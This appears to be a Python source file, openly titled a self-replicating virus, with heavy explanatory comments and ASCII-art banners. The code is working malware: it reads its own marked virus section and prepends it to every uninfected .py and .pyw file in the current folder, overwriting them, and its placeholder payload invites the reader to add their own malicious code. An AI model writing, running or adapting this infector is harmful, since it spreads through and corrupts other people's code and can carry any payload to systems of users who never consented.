"""
*************************************************************************************************
𝕻𝖗𝖔𝖌𝖗𝖆𝖒 𝕹𝖆𝖒𝖊    : 𝕾𝖊𝖑𝖋 𝕽𝖊𝖕𝖑𝖎𝖈𝖆𝖙𝖎𝖓𝖌 𝖁𝖎𝖗𝖚𝖘
𝕬𝖚𝖙𝖍𝖔𝖗          : 𝕸𝖔𝖓𝖙𝖆𝖘𝖎𝖒
𝕮𝖗𝖊𝖆𝖙𝖊 𝕺𝖓       : 11.11.2020

Variable used in this program
-------------------------------------------------------------------------------------------------
code            - take code from virus file
lines           - reads every lines from virus program
virus_area      - check if we are inside of virus area
script          - any single file from parent folder
python_scripts  - get all file from parent folder
script_code     - read all code from file that will be infected
infected        - check if file is already infected or not
final_code      - combination of malicious code & existing code of a file
*************************************************************************************************
"""

### START OF VIRUS ###

#   sys is for finding file name in parent folder & glob is for finding a specific file type
import sys, glob

# this is the code of the current file
code = []
#   Opening current file from parent folder in read mode.
#   This code will be injected to other files and will make them infected.
#   So this program need to dynamically get all the file name from parent folder. sys.argv[0] does that work.
#   0 means the file name of current file.
with open(sys.argv[0], 'r', encoding="utf8") as f:
    #   read every line from current file
    lines = f.readlines()

# Assuming program is not inside of virus area
virus_area = False
for line in lines:
    #   if '### START OF VIRUS ###' is found inside any file means program is inside of virus area
    if line == '### START OF VIRUS ###\n':
        #   we are in virus area now
        virus_area = True

    #   when inside virus area add malicious code to files
    if virus_area:
        code.append(line)

    #   when '### END OF VIRUS ###' is found inside code program will exit from virus area
    if line == '### END OF VIRUS ###\n':
        break

#   search for specific file type like .py , .pyw
#   this program will infect all files that is defined here
#   Add any file type here to infect those file
python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

#   shows which file type will be infected
#   print(python_scripts)

#   opening other files that will be infected with payload
for script in python_scripts:
    with open(script, 'r', encoding="utf8") as f:
        script_code = f.readlines()

    #   initially assumes that file is not infected
    infected = False
    for line in script_code:
        #   when '### START OF VIRUS ###\n' this line is found inside of a file means that file is infected.
        if line == '### START OF VIRUS ###\n':
            infected = True
            #   when a file is already infected no need to infect that file again. So exit.
            break

    #   when files are not infected this program will infect those files
    if not infected:
        #   final code is the combination of malicious code & code that is already inside of a file.
        final_code = []
        #   firstly adding malicious code
        final_code.extend(code)
        #   adding a new line to distinguish between malicious code & file's code.
        final_code.extend('\n')
        #   adding file's actual code
        final_code.extend(script_code)

        #   opening the file that will be infected as writing mode
        with open(script, 'w', encoding="utf8") as f:
            #   overwriting the original file with the combination of malicious code & file's code.
            f.writelines(final_code)

#   Malicious piece of code (Payload). Write your code here and it will be added to the infected file.
print("Hello World!")

### END OF VIRUS ###

"""
────────────────────────────────────────────────────────────────────────────────────────────────────────────
─██████──────────██████─██████████████─████████████───██████████████────██████████████───████████──████████─
─██░░██████████████░░██─██░░░░░░░░░░██─██░░░░░░░░████─██░░░░░░░░░░██────██░░░░░░░░░░██───██░░░░██──██░░░░██─
─██░░░░░░░░░░░░░░░░░░██─██░░██████░░██─██░░████░░░░██─██░░██████████────██░░██████░░██───████░░██──██░░████─
─██░░██████░░██████░░██─██░░██──██░░██─██░░██──██░░██─██░░██────────────██░░██──██░░██─────██░░░░██░░░░██───
─██░░██──██░░██──██░░██─██░░██████░░██─██░░██──██░░██─██░░██████████────██░░██████░░████───████░░░░░░████───
─██░░██──██░░██──██░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██────██░░░░░░░░░░░░██─────████░░████─────
─██░░██──██████──██░░██─██░░██████░░██─██░░██──██░░██─██░░██████████────██░░████████░░██───────██░░██───────
─██░░██──────────██░░██─██░░██──██░░██─██░░██──██░░██─██░░██────────────██░░██────██░░██───────██░░██───────
─██░░██──────────██░░██─██░░██──██░░██─██░░████░░░░██─██░░██████████────██░░████████░░██───────██░░██───────
─██░░██──────────██░░██─██░░██──██░░██─██░░░░░░░░████─██░░░░░░░░░░██────██░░░░░░░░░░░░██───────██░░██───────
─██████──────────██████─██████──██████─████████████───██████████████────████████████████───────██████───────
────────────────────────────────────────────────────────────────────────────────────────────────────────────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─██████──────────██████─██████████████─██████──────────██████─██████████████─██████████████─██████████████─██████████─██████──────────██████─
─██░░██████████████░░██─██░░░░░░░░░░██─██░░██████████──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░██████████████░░██─
─██░░░░░░░░░░░░░░░░░░██─██░░██████░░██─██░░░░░░░░░░██──██░░██─██████░░██████─██░░██████░░██─██░░██████████─████░░████─██░░░░░░░░░░░░░░░░░░██─
─██░░██████░░██████░░██─██░░██──██░░██─██░░██████░░██──██░░██─────██░░██─────██░░██──██░░██─██░░██───────────██░░██───██░░██████░░██████░░██─
─██░░██──██░░██──██░░██─██░░██──██░░██─██░░██──██░░██──██░░██─────██░░██─────██░░██████░░██─██░░██████████───██░░██───██░░██──██░░██──██░░██─
─██░░██──██░░██──██░░██─██░░██──██░░██─██░░██──██░░██──██░░██─────██░░██─────██░░░░░░░░░░██─██░░░░░░░░░░██───██░░██───██░░██──██░░██──██░░██─
─██░░██──██████──██░░██─██░░██──██░░██─██░░██──██░░██──██░░██─────██░░██─────██░░██████░░██─██████████░░██───██░░██───██░░██──██████──██░░██─
─██░░██──────────██░░██─██░░██──██░░██─██░░██──██░░██████░░██─────██░░██─────██░░██──██░░██─────────██░░██───██░░██───██░░██──────────██░░██─
─██░░██──────────██░░██─██░░██████░░██─██░░██──██░░░░░░░░░░██─────██░░██─────██░░██──██░░██─██████████░░██─████░░████─██░░██──────────██░░██─
─██░░██──────────██░░██─██░░░░░░░░░░██─██░░██──██████████░░██─────██░░██─────██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░██─██░░██──────────██░░██─
─██████──────────██████─██████████████─██████──────────██████─────██████─────██████──██████─██████████████─██████████─██████──────────██████─
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
"""
